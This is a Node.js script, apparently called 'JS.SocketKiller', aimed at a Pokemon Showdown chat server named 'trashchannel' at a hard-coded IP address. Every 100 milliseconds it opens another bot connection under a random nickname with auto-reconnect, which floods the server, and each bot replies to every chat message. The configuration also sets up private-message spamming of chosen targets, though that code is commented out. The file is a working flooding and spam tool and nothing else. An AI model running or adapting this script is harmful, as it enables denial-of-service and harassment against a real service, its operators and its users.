'use strict';
const Client = require('ps-bot-webhook');

// Identify
try {
	console.log("======================================");
	console.log("--> Project S.U.R.C : Type #Socket (Node)");
	console.log("======================================");
	console.log("--> Name : Shadow's Desire (Node) / JS.SocketKiller");
} catch (e) {}

// Server Config Stuff
let ServerName = 'trashchannel'; // Server's name, EG: amethyst.psim.us - ServerName would be "amethyst".
let ServerAddr = '219.188.124.19'; // Server's IP address, EG: 127.0.0.1 (Localhost)
let ServerPort = 8000; // Server's Active Port, Usually 8000 (Mid Ranged)

// PM Spamming
let togglePM = false; // Set to true to enable spamming PMs (Don't work)
let pmTargets = []; // Change "example" to name of target to spam
let pmMessage = ''; // Change to whatever you wish to spam them with.
let msgDelay = 100; // Time in milliseconds between messages

// DO NOT TOUCH
let Internal = {}; // Set a blank array

setInterval( () => {
	let InternalName = Math.random().toString(36).substring(8);
	let KillOpt = {
		serverid: ServerName,
		connectionTimeout: 2 * 60 * 1000,
		loginServer: 'https://play.pokemonshowdown.com/~~' + ServerName + '/action.php',
		nickName: InternalName,
		pass: '',
		retryLogin: 10 * 1000,
		autoReconnect: true,
		autoReconnectDelay: 2 * 1000,
		autoJoin: [],
		showErrors: true,
		debug: true,
	};
	if (!Internal[InternalName]) Internal[InternalName] = new Client(ServerAddr, ServerPort, KillOpt);
	Internal[InternalName].connect();
	
	Internal[InternalName].on('chat', function (room, time, by, message) {
		Internal[InternalName].say(room, 'To which do I owe the honour? ' + Math.round(Math.random() * 1000));
		
		Internal[InternalName].on('message', function (message) {
			console.log(message);
		});
	});
	
// setInternal( () => {
	// for (let i = 0; i < pmTargets.length; i++) {
	// Internal[InternalName].pm(pmTargets[i], pmMessage);
// }
// }, msgDelay);
}, 100);
